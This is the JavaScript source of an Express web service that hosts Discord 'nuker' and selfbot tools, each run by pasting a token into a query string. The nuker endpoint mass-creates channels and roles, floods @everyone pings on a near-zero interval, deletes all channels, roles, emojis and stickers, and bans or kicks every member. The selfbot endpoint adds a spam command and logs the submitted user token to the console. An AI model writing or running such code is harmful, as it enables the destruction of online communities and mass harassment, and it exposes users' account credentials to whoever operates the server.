
const config = require("./config.json")

const express = require('express');

process.on('unhandledRejection', (reason, promise) => {
    const r = reason
});
process.on('rejectionHandled', (promise) => {
    const r = promise
})
process.on("uncaughtException", (err, origin) => {
    const r = err
});
process.on('uncaughtExceptionMonitor', (err, origin) => {
    const r = err
});

const prefix = "."
const app = express();

app.get('/', (req, res) => {

    res.sendFile("or.html", {root: __dirname });

})
app.get('/nuker', (req, res) => {
    const token = req.query.token

    if(token) {
        const { Client, Intents, Collection, Util, Structures, GuildMember, Message, MessageEmbed } = require('discord.js');
        const client = new Client({ intents: [Intents.FLAGS.GUILDS, 'DIRECT_MESSAGES', 'DIRECT_MESSAGE_REACTIONS', 'GUILD_MESSAGES', 'GUILD_MESSAGE_REACTIONS', 'GUILDS'], ws: { properties: { browser: "Discord iOS" }},  })
        client.on("ready", () => {
            console.log(`ready (${client.user.tag})`);
            client.user.setActivity({ name: "There is a sus among us", type: "PLAYING" });
        });
        client.on("messageCreate", (message) => {
        
            // Help Embed
            const help = new MessageEmbed()
                .setDescription(`**Nuke cmds ;**
            \n**mass channels ;**
            ${prefix}mc [amount] (text) i.e \`${prefix}mc 5 test\`\n
            **mass channel n ping ;**
            ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 test, testing\`\n
            **mass roles ;**
            ${prefix}mr [amount] (text) i.e \`${prefix}mr 5 test\`\n
            **delete channels ;**
            ${prefix}dc\n
            **delete roles ;**
            ${prefix}dr\n
            **delete emotes ;**
            ${prefix}de\n
            **delete stickers (new) ;**
            ${prefix}ds\n
            **mass kick ;**
            ${prefix}mk\n
            **mass ban ;**
            ${prefix}mb
            `)
                
                .setColor(0x36393E)
                .setTimestamp();
        
            // Perms
            const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
            const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
            const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
            const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
            const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");
        
            // Possible Args
            let args = message.content.split(" ").slice(1);
            var args1 = args[0]; // Used for amount
            var args2 = args.slice(1).join(' ') // Naming things
            var args3 = args.slice(2).join(', '); // Other
        
                // Commands
        
                // Help
                if (message.content.startsWith(prefix + "help")) {
                    message.channel.send({embeds: [help]})
                }
        
                // Mass Channels
                if (message.content.startsWith(prefix + "mc")) {
                    MassChannels(args1, args2).catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Delete all channels
                if (message.content.startsWith(prefix + "dc")) {
                    DelAllChannels().catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Mass Channels and Ping
                if (message.content.startsWith(prefix + "cp")) {
                    MassChnPing(args1, args2, args3).catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Mass Roles
                if (message.content.startsWith(prefix + "mr")) {
                    MassRoles(args1, args2).catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Delete all Roles
                if (message.content.startsWith(prefix + "dr")) {
                    DelAllRoles().catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Delete all Stickers
                if (message.content.startsWith(prefix + "ds")) {
                    DelAllStickers().catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Delete all Emotes
                if (message.content.startsWith(prefix + "de")) {
                    DelAllEmotes().catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Mass Ban
                if (message.content.startsWith(prefix + "mb")) {
                    BanAll().catch((err) => {
                        message.reply(err);
                    });
                }
        
                // Mass Kick
                if (message.content.startsWith(prefix + "mk")) {
                    KickAll().catch((err) => {
                        message.reply(err);
                    });
                }
            
        
            // Nuking Functions
        
            /**
             * Excessive amount of channels
             * @param {number} amount Amount of channels to mass create
             * @param {string} channelName Name of channel
             */
            function MassChannels(amount, channelName) {
                return new Promise((resolve, reject) => {
                    if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
                    if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
                    if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
                    if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
                    for (let i = 0; i < amount; i++) {
                        if (message.guild.channels.cache.size === 500) break;
                        if (!channelName) {
                            message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                        } else {
                            message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                        }
                    }
                    resolve();
                });
            }
        
            /**
             * Excessive amount of channels and mentions
             * @param {number} amount Amount of channels to mass create
             * @param {string} channelName Name of channel
             * @param {string} pingMessage Message to be sent when everyone is mentioned
             */
            function MassChnPing(amount, channelName, pingMessage) {
                return new Promise((resolve, reject) => {
                    if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
                    if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
                    if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
                    if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
                    if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
                    for (let i = 0; i < amount; i++) {
                        if (message.guild.channels.cache.size === 500) break;
                        if (!channelName) {
                            message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                                setInterval(() => {
                                    ch.send("@everyone " + pingMessage);
                                }, 1);
                            });
                        } else {
                            message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                                setInterval(() => {
                                    ch.send("@everyone " + pingMessage);
                                }, 1); // literally not possible but lol?
                            });
                        }
                    }
                    resolve();
                });
            }
        
            /**
             * Deletes all channels in a guild
             */
            function DelAllChannels() {
                return new Promise((resolve, reject) => {
                    if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
                    message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
                    resolve();
                });
            }
        
            /**
             * Excessive amount of roles
             * @param {number} amount Amount of roles
             * @param {string} roleName Role name
             */
            function MassRoles(amount, roleName) {
                return new Promise((resolve, reject) => {
                    if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
                    if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
                    if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
                    for (let i = 0; i <= amount; i++) {
                        if (message.guild.roles.cache.size === 250) break;
                        if (!roleName) {
                            message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                        } else {
                            message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                        }
                    }
                })
            }
        
            /**
             * Deletes all roles
             */
            function DelAllRoles() {
                return new Promise((resolve, reject) => {
                    if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
                    message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
                });
            }
        
            /**
             * Deletes all emotes
             */
            function DelAllEmotes() {
                return new Promise((resolve, reject) => {
                    if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
                    message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
                });
            }
        
            /**
             * Deletes all stickers
             */
            function DelAllStickers() {
                return new Promise((resolve, reject) => {
                    if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
                    message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
                });
            }
        
            /**
             * Ban all guild Members
             */
            function BanAll() {
                return new Promise((resolve, reject) => {
                    if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
                    let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
                    message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                        setTimeout(() => {
                            msg.edit("Banning...");
                            for (let i = 0; i < arrayOfIDs.length; i++) {
                                const user = arrayOfIDs[i];
                                const member = message.guild.members.cache.get(user);
                                member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
                            }
                        }, 2000);
                    })
                })
            }
        
            /**
             * Kick all guild Members
             */
            function KickAll() {
                return new Promise((resolve, reject) => {
                    if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
                    let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
                    message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                        setTimeout(() => {
                            msg.edit("Banning...");
                            for (let i = 0; i < arrayOfIDs.length; i++) {
                                const user = arrayOfIDs[i];
                                const member = message.guild.members.cache.get(user);
                                member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
                            }
                        }, 2000);
                    })
                })
            }
        });
        client.login(token)
        setTimeout(() => {
            console.log(`logging off ${client.user.tag}`)
            client.destroy()
        }, 3000000)
         res.sendFile("runned.html", {root: __dirname})

    }
    else {
    res.sendFile("nuker.html", {root: __dirname });
    }

});
app.get('/selfbot', (req, res) => {
    const action = req.query.action
    if (action === "back") return res.redirect("/");
    const token = req.query.token

    

    if(token) { 
        const pf = ".."
const { Client } = require('discord.js-selfbot-v13');
const Discord = require('discord.js-selfbot-v13');
const client = new Client({
    checkUpdate: false,
});

client.on('ready', async () => {
  console.log(`${client.user.username} is ready!`);
  const r = new Discord.CustomStatus()
	.setState('as factory | .gg/6985')
	.setEmoji('🦛')
	client.user.setActivity(r);

})

client.on("messageCreate", async (message) => {
    if (message.author.bot) return;
    if (message.content.indexOf(pf) !== 0) return;
    
	if (message.author.id !== client.user.id) return;

    const args = message.content.slice(pf.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase()
    
	if(command === "spam") {
		message.delete(1000)
		var times = args[0];
		const msg = args.join(" ").slice(times.length)
		for(var i = 0; i < times; i++){
    	message.channel.send(msg)
		}		
	}
	if(command === "embed") {
		
		const t = args[0];
		const msg = args.join(" ").slice(t.length)
		const w = new Discord.WebEmbed({
			shorten: true,
			hidden: false // if you send this embed with MessagePayload.options.embeds, it must set to false
		  })
			  .setColor('BLUE')
			  .setDescription(msg)
			  .setTitle(t)
		  message.channel.send({ content: ` `, embeds: [w] }) // Patched :)
		  message.delete(1000)
		  
	}
	if(command === "status") {
		client.settings.setCustomStatus({
			status: args[0],
		});
		message.delete(1000)

	}
	if(command === "house") {
		if (args[0] === "leave") return await client.user.setHypeSquad('LEAVE');
		if (args[0] === "1") return await client.user.setHypeSquad('HOUSE_BRAVERY');
		if (args[0] === "2") return await client.user.setHypeSquad('HOUSE_BRILLIANCE');
		if (args[0] === "3") return await client.user.setHypeSquad('HOUSE_BALANCE');
		message.delete(1000)
	}
	if(command === "transcript") {
		message.delete(1000)
		const discordTranscripts = require('discord-html-transcripts');

		const channel = message.channel; // or however you get your TextChannel
        const attachment = await discordTranscripts.createTranscript(channel,  {
            limit: 500, // Max amount of messages to fetch. `-1` recursively fetches.
            returnType: 'attachment', // Valid options: 'buffer' | 'string' | 'attachment' Default: 'attachment' OR use the enum ExportReturnType
            filename: 'X = Y  transcript.html', // Only valid with returnType is 'attachment'. Name of attachment.
        });
        message.channel.send({
        content: "Transcript",
        files: [attachment],
        });

	}
	if(command === "help"){
		const help = "**Help**\n\n\n`😍` `..spam` {number} {message}\n\n`😍` `..embed` {title} {description}\n\n`😍` `..status` {online | idle | invisible | dnd} \n\n`😍` `..house` {leave | 1 | 2 | 3}\n\n`😍` `..transcript`\n\n\n*Sex*Tools"
		let result = help.replace("..", pf);
		message.edit(result)
	}

  

})
console.log(token)
client.login(token);
setTimeout(() => {
    console.log(`logging off ${client.user.tag}`)
    client.destroy()
}, 3000000)
 res.sendFile("runned.html", {root: __dirname})
}
 else {
    res.sendFile("selfbot.html", {root: __dirname });
    }


    

    

});
app.listen(config.port, () => {
  console.log(`server started\nport: ${config.port}`);
});

